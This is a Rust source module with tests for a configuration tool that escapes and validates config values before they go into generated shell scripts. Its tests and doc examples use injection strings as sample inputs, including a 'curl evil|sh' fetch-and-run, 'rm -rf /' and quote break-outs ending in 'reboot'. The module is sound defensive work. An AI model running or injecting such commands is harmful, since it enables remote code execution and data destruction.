//! FJ-154 / GH #154: Shell-escaping helpers for config-derived values.
//!
//! Resource handlers generate shell scripts by interpolating values that
//! originate from config YAML and recipe `{{inputs.*}}` templates. Wrapping
//! those values in single quotes *without* escaping embedded single quotes
//! lets a value break out of its quoting and inject arbitrary shell
//! (bug-hunt defects #11–#16). This module centralizes the one correct
//! escaping primitive plus the identifier validators the handlers use to
//! constrain structural fields (firewall verbs, repo slugs, hostnames, …).
//!
//! Design rules:
//! - `sh_squote` is the single canonical "wrap an arbitrary data value as one
//!   shell word" helper. Every data-field interpolation in a resource handler
//!   should go through it instead of hand-writing `'{value}'`.
//! - Control characters (including NUL and newline) cannot safely survive
//!   inside a single shell word, so `sh_squote` strips them. A NUL byte would
//!   silently truncate the argument in `execve`; embedded newlines would split
//!   a command across lines. Stripping (rather than escaping) keeps the
//!   function infallible so it composes cleanly inside `format!`.

/// Wrap an arbitrary string as a single, safely-quoted POSIX shell word.
///
/// Uses the standard single-quote escaping idiom: a literal single quote is
/// rendered as `'\''` (close quote, escaped quote, reopen quote). The result
/// is always wrapped in single quotes, so `$`, backticks, `"`, `\`, spaces,
/// globs and `;` are all inert — the shell treats the entire result as one
/// literal word.
///
/// Control characters are removed (see module docs) before quoting.
///
/// # Examples
/// ```
/// use forjar::core::shell_escape::sh_squote;
/// assert_eq!(sh_squote("simple"), "'simple'");
/// // A single quote in the payload can no longer break out:
/// assert_eq!(sh_squote("x';reboot;'"), "'x'\\'';reboot;'\\'''");
/// // Command substitution is neutralized — it stays literal text:
/// assert_eq!(sh_squote("$(reboot)"), "'$(reboot)'");
/// ```
pub fn sh_squote(s: &str) -> String {
    let cleaned: String = s.chars().filter(|c| !is_shell_unsafe_control(*c)).collect();
    format!("'{}'", cleaned.replace('\'', "'\\''"))
}

/// True for control characters that must never appear inside a shell word.
///
/// Tab is allowed (single-quoting makes it a literal). NUL, newline, carriage
/// return and other C0/C1 controls are not.
fn is_shell_unsafe_control(c: char) -> bool {
    // Allow horizontal tab; reject every other control character.
    c != '\t' && c.is_control()
}

/// Validate a GitHub `owner/repo` slug.
///
/// Accepts exactly one `/`, with each side restricted to `[A-Za-z0-9._-]+`.
/// Rejects empty sides, shell metacharacters, whitespace and path traversal.
pub fn is_valid_repo(repo: &str) -> bool {
    let mut parts = repo.split('/');
    match (parts.next(), parts.next(), parts.next()) {
        (Some(owner), Some(name), None) => is_repo_segment(owner) && is_repo_segment(name),
        _ => false,
    }
}

/// A single `owner` or `repo` path segment: non-empty `[A-Za-z0-9._-]`.
fn is_repo_segment(seg: &str) -> bool {
    !seg.is_empty()
        && seg
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

/// Validate a `ufw` action verb against the fixed allow-list.
///
/// `ufw` only accepts these rule verbs; anything else (including injected
/// shell like `allow; reboot #`) is rejected so the action can be
/// interpolated unquoted as a bare token.
pub fn is_valid_ufw_action(action: &str) -> bool {
    matches!(action, "allow" | "deny" | "reject" | "limit")
}

/// Emit the shell that writes exactly `bytes` to `path`, with no delimiter for
/// the payload to escape.
///
/// # Why not a heredoc (defect C8, GH #296)
///
/// A heredoc body is literal only up to the first line that equals its
/// delimiter. Interpolating managed content into `<<'FORJAR_EOF'` therefore
/// hands the target machine arbitrary *shell* the moment the content contains a
/// `FORJAR_EOF` line: the heredoc closes early, the rest of the content is
/// parsed as commands, and a payload that reopens a heredoc to swallow the
/// generator's own trailing delimiter leaves the script exiting 0 — so apply
/// reports the resource converged with the wrong bytes on disk.
///
/// Choosing a different delimiter does not fix it, and neither does deriving
/// one from the content: the safety of *any* delimited encoding is a claim
/// about the payload, and the payload is arbitrary. So this primitive has no
/// delimiter at all. The bytes are base64 — an alphabet (`A-Za-z0-9+/=`) with
/// no quote, no newline and no shell metacharacter — wrapped as one
/// single-quoted shell word and decoded on the target. Nothing in `bytes` can
/// reach the shell's parser, for any `bytes` whatsoever.
///
/// Byte-exactness comes with it. A heredoc body is a sequence of
/// newline-terminated lines, so it can never reproduce content that does not
/// end in a newline (it appends one) — `base64 -d` writes precisely the bytes
/// that were encoded, including CRLF, trailing whitespace and no trailing
/// newline at all.
///
/// # Examples
/// ```
/// use forjar::core::shell_escape::sh_write_file;
/// assert_eq!(sh_write_file("/etc/x", b"hi"), "echo 'aGk=' | base64 -d > '/etc/x'");
/// // Content that would have closed the old heredoc is inert here:
/// let s = sh_write_file("/etc/x", b"FORJAR_EOF\nreboot\n");
/// assert!(!s.contains("reboot"));
/// ```
pub fn sh_write_file(path: &str, bytes: &[u8]) -> String {
    use base64::Engine;
    let b64 = base64::engine::general_purpose::STANDARD.encode(bytes);
    format!("echo {} | base64 -d > {}", sh_squote(&b64), sh_squote(path))
}

/// Recover the bytes a [`sh_write_file`] line deploys to `path`.
///
/// Test-only. It exists so a test can assert on the CONTENT a generated script
/// deploys instead of on the transport encoding. Asserting on the encoding is
/// what let defect C8 live: every test looked for `FORJAR_EOF` and the literal
/// content in the script text, and both were always present — including in the
/// scripts where the content had escaped the heredoc and truncated the file.
#[cfg(test)]
pub(crate) fn decode_written_file(script: &str, path: &str) -> Option<Vec<u8>> {
    use base64::Engine;
    let suffix = format!(" | base64 -d > {}", sh_squote(path));
    let line = script.lines().find(|l| l.ends_with(&suffix))?;
    let b64 = line
        .strip_suffix(&suffix)?
        .strip_prefix("echo '")?
        .strip_suffix('\'')?;
    base64::engine::general_purpose::STANDARD.decode(b64).ok()
}

/// Validate a hostname or IP literal for use as an SSH/rsync target.
///
/// Accepts DNS hostnames and IPv4/IPv6 literals: `[A-Za-z0-9.:_-]+` with no
/// shell metacharacters or whitespace. Deliberately permissive about
/// dotted/colon forms (covers IPv6) but rejects anything that could break out
/// of quoting or inject a second argument.
pub fn is_valid_host(host: &str) -> bool {
    !host.is_empty()
        && host
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | ':' | '_' | '-'))
}

/// True if `path` is an absolute POSIX path (`/`-rooted).
pub fn is_absolute_path(path: &str) -> bool {
    path.starts_with('/')
}

/// Validate an `IPv4/CIDR` literal for the fleet overlay (e.g. `10.42.0.11/24`).
///
/// FJ-035: the overlay IP is interpolated into a systemd `ExecStart=` line and
/// `ip addr add` arguments. Constraining it to a strict dotted-quad plus a
/// `/0..=32` prefix means every octet/prefix is a small integer with no shell
/// metacharacters, whitespace, or substitution — safe to embed as a bare token.
pub fn is_valid_overlay_ip(ip_cidr: &str) -> bool {
    let (addr, prefix) = match ip_cidr.split_once('/') {
        Some((a, p)) => (a, p),
        None => return false,
    };
    // Prefix must be a 0..=32 integer.
    match prefix.parse::<u8>() {
        Ok(p) if p <= 32 => {}
        _ => return false,
    }
    // Address must be four 0..=255 dotted octets.
    let octets: Vec<&str> = addr.split('.').collect();
    if octets.len() != 4 {
        return false;
    }
    octets
        .iter()
        .all(|o| !o.is_empty() && o.parse::<u8>().is_ok())
}

/// Validate a network-interface name (e.g. `enp9s0`, `eth0`, `wlan0`).
///
/// FJ-035: an explicit `interface:` value flows into `ip addr add ... dev <if>`.
/// Linux iface names are `[A-Za-z0-9._-]` (no whitespace/slash/metachars), so
/// this allow-list lets it be interpolated as a bare, unquoted token safely.
pub fn is_valid_iface(iface: &str) -> bool {
    !iface.is_empty()
        && iface.len() <= 15
        && iface
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

/// Slugify an identifier to `[A-Za-z0-9._-]`, replacing every other character
/// with `-`. Used for values that become part of a filename (e.g. service
/// log/pid paths) where even quoting is not enough because the value is also
/// embedded in shared, structurally-significant paths.
///
/// Returns `"task"` for an input that is empty after slugification, so callers
/// always get a usable, collision-resistant token.
pub fn slugify_identifier(name: &str) -> String {
    let slug: String = name
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') {
                c
            } else {
                '-'
            }
        })
        .collect();
    let trimmed = slug.trim_matches('-');
    if trimmed.is_empty() {
        "task".to_string()
    } else {
        trimmed.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Statically verify a string is a single, well-formed single-quoted shell
    /// word produced by the `'\''` escaping idiom — without spawning a shell.
    ///
    /// After collapsing every `'\''` escape sequence to nothing, a correctly
    /// escaped value must be exactly `'<body>'` where `<body>` contains no raw
    /// single quotes. If a payload had broken out, a stray unbalanced quote
    /// would remain and this check would fail.
    fn shell_word_is_balanced(s: &str) -> bool {
        let collapsed = s.replace("'\\''", "");
        collapsed.starts_with('\'')
            && collapsed.ends_with('\'')
            && collapsed.len() >= 2
            && !collapsed[1..collapsed.len() - 1].contains('\'')
    }

    #[test]
    fn squote_plain_value() {
        assert_eq!(sh_squote("hello"), "'hello'");
        assert_eq!(sh_squote("/etc/foo"), "'/etc/foo'");
        assert_eq!(sh_squote(""), "''");
    }

    #[test]
    fn squote_neutralizes_embedded_single_quote() {
        // The classic break-out payload from defect #14.
        let escaped = sh_squote("x';reboot;'");
        assert_eq!(escaped, "'x'\\'';reboot;'\\'''");
        // Every embedded single quote was turned into the `'\''` escape: the
        // original never appears as a bare quote that could close our wrapper.
        // Count of escape sequences == count of quotes in the input (2).
        assert_eq!(escaped.matches("'\\''").count(), 2);
        // The payload is a single shell word: it begins and ends quoted, so
        // the `;reboot;` is always inside a quoted region, never bare shell.
        assert!(escaped.starts_with('\'') && escaped.ends_with('\''));
        assert!(shell_word_is_balanced(&escaped));
    }

    #[test]
    fn squote_neutralizes_command_substitution() {
        // Inside single quotes `$(...)` and backticks are literal text.
        assert_eq!(sh_squote("$(reboot)"), "'$(reboot)'");
        assert_eq!(sh_squote("`id`"), "'`id`'");
        assert_eq!(
            sh_squote("latest\";curl evil|sh;\""),
            "'latest\";curl evil|sh;\"'"
        );
    }

    #[test]
    fn squote_strips_control_chars() {
        // NUL, newline and CR are removed; surrounding text stays quoted.
        assert_eq!(sh_squote("a\nb"), "'ab'");
        assert_eq!(sh_squote("a\0b"), "'ab'");
        assert_eq!(sh_squote("a\rb"), "'ab'");
        // Tab is preserved (a benign literal inside quotes).
        assert_eq!(sh_squote("a\tb"), "'a\tb'");
    }

    #[test]
    fn squote_double_break_attempt() {
        // Two break-out attempts in one value remain fully contained.
        let s = sh_squote("'; rm -rf / #");
        assert!(s.starts_with('\''));
        assert!(s.ends_with('\''));
        // The single raw quote from the input was escaped to `'\''`.
        assert_eq!(s.matches("'\\''").count(), 1);
        assert!(shell_word_is_balanced(&s));
    }

    #[test]
    fn repo_validation() {
        assert!(is_valid_repo("paiml/forjar"));
        assert!(is_valid_repo("a-b_c.d/x.y-z_1"));
        assert!(!is_valid_repo("paiml"));
        assert!(!is_valid_repo("a/b/c"));
        assert!(!is_valid_repo("x/y$(id)"));
        assert!(!is_valid_repo("x';reboot;'/y"));
        assert!(!is_valid_repo("/y"));
        assert!(!is_valid_repo("x/"));
        assert!(!is_valid_repo(""));
        assert!(!is_valid_repo("a b/c"));
    }

    #[test]
    fn ufw_action_validation() {
        for ok in ["allow", "deny", "reject", "limit"] {
            assert!(is_valid_ufw_action(ok));
        }
        assert!(!is_valid_ufw_action("allow; reboot #"));
        assert!(!is_valid_ufw_action("ALLOW"));
        assert!(!is_valid_ufw_action(""));
        assert!(!is_valid_ufw_action("allow extra"));
    }

    #[test]
    fn host_validation() {
        assert!(is_valid_host("cache.internal"));
        assert!(is_valid_host("10.0.0.1"));
        assert!(is_valid_host("fe80::1"));
        assert!(is_valid_host("build-box_1"));
        assert!(!is_valid_host(""));
        assert!(!is_valid_host("host';reboot;'"));
        assert!(!is_valid_host("a host"));
        assert!(!is_valid_host("$(id)"));
    }

    #[test]
    fn absolute_path_validation() {
        assert!(is_absolute_path("/var/lib/forjar"));
        assert!(!is_absolute_path("relative/path"));
        assert!(!is_absolute_path("~/foo"));
        assert!(!is_absolute_path(""));
    }

    #[test]
    fn slugify_identifier_cases() {
        assert_eq!(slugify_identifier("my-svc"), "my-svc");
        assert_eq!(slugify_identifier("a b"), "a-b");
        assert_eq!(slugify_identifier("x; rm -rf ~ #"), "x--rm--rf");
        assert_eq!(slugify_identifier("with.dot_and-dash"), "with.dot_and-dash");
        assert_eq!(slugify_identifier(""), "task");
        assert_eq!(slugify_identifier("///"), "task");
    }
}
